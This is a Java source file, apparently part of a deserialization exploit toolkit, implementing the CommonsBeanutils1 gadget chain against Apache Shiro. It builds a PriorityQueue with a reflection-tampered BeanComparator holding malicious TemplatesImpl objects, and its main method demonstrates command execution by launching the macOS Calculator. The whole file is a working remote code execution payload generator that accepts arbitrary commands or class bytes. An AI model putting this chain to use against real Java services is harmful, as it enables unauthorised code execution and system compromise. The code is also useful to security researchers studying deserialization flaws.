package xyz.eki.marshalexp.poc;

import org.apache.commons.beanutils.BeanComparator;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.math.BigInteger;
import java.util.PriorityQueue;

public class CB1Shiro implements POC{
    public static Object getPocObject(Object poc) throws Exception {
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        ReflectUtils.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectUtils.getFieldValue(queue, "queue");
        queueArray[0] = poc;
        queueArray[1] = poc;
        return queue;
    }

    @Override
    public Object getPocObject(byte[] clzBytes) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(clzBytes));
    }

    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(cmd));
    }

    public static void main(String[] args) throws Exception{
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new CB1Shiro().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
